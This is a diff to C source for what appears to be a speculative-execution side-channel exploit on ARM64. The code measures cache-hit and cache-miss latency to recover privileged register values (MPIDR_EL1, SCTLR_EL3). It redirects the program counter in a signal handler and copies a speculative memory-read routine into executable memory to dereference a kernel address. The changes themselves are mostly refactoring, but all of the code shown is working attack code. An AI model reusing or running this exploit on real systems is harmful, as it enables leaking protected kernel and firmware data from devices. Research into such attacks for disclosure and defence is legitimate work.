@@ -28,7 +28,6 @@ enum _regs {
 } regs;
 
 #define DEBUG 0
-/*#define BY_ARTICLE*/
 
 #if DEBUG
 #define debug(...) printf(__VA_ARGS__)
@@ -130,11 +129,11 @@ void get_value(int i, siginfo_t *info, void *ctx) {
 	}
 
 	ucontext_t *c = (ucontext_t *)ctx;
-	// when returning from signal handling go to ret of the spec_read (or mem_read)
-#ifdef BY_ARTICLE
-	c->uc_mcontext.pc += 28;
-#else
+	// when returning from signal handler go to ret of the spec_read (or mem_read)
+#if !defined (APPLY_COUNTERPART)
 	c->uc_mcontext.pc += 24;
+#else
+	c->uc_mcontext.pc += 40;
 #endif
 }
 #endif
@@ -171,7 +170,7 @@ int read_register(enum _regs regs, uint64_t *val) {
 	int timeout = 20000;
 
 	debug("zrbf@ %p zrbf_stride*sizeof(uintptr_t) %lu\n", 
-	(void*)zrbf,(unsigned long) zrbf_stride*sizeof(uintptr_t));
+		(void*)zrbf,(unsigned long) zrbf_stride*sizeof(uintptr_t));
 
 	uint64_t cur_value = 0;
 	for (uint64_t bit = 0; bit < 64; bit++) {
@@ -285,9 +284,9 @@ uint64_t measure_latency() {
 		if (ns[0] < min[0]) min[0] = ns[0];
 	}
 
-	debug("avg latency for cache miss %lu\n", total[0]/300); 
-	debug("min latency for cache miss %lu\n", min[0]); 
-	debug("avg latency for cache hit %lu\n", total[1]/300);
+	printf("avg latency for cache miss %lu\n", total[0]/300); 
+	printf("min latency for cache miss %lu\n", min[0]); 
+	printf("avg latency for cache hit %lu\n", total[1]/300);
 	return total[0]/300/*min*/;
 }
 
@@ -337,7 +336,6 @@ int main() {
 	}
 	miss_min -=1;
 
-#if 1
 	if (read_register(MPIDR_EL1, &val) == 0) {
 		printf("%s: 0x%lx", "MPIDR_EL1", val);
 		printf(" (cpu%u, cluster%u)\n", 
@@ -350,20 +348,13 @@ int main() {
 		printf("%s: 0x%lx\n", "SCTLR_EL3", val);
 	else 
 		printf("Deciphering sctlr_el3 failed\n");
-#endif
 
 { 
 	/* this part tries to do the memory address dereference */
 	int rc;
 	unsigned long memory;
 	do_mem_read = (void (*)(void *, void*, uint64_t, uint64_t))codebuf;
-	memcpy(codebuf, 
-#ifdef BY_ARTICLE
-mem_read_by_article, 
-#else 
-mem_read,
-#endif
-	CODE_SIZE);
+	memcpy(codebuf, mem_read, CODE_SIZE);
 	__clear_cache(codebuf, codebuf + CODE_SIZE + 1);
 	
 	/* memory to deference 0xFFFFFFC00009ACE8 
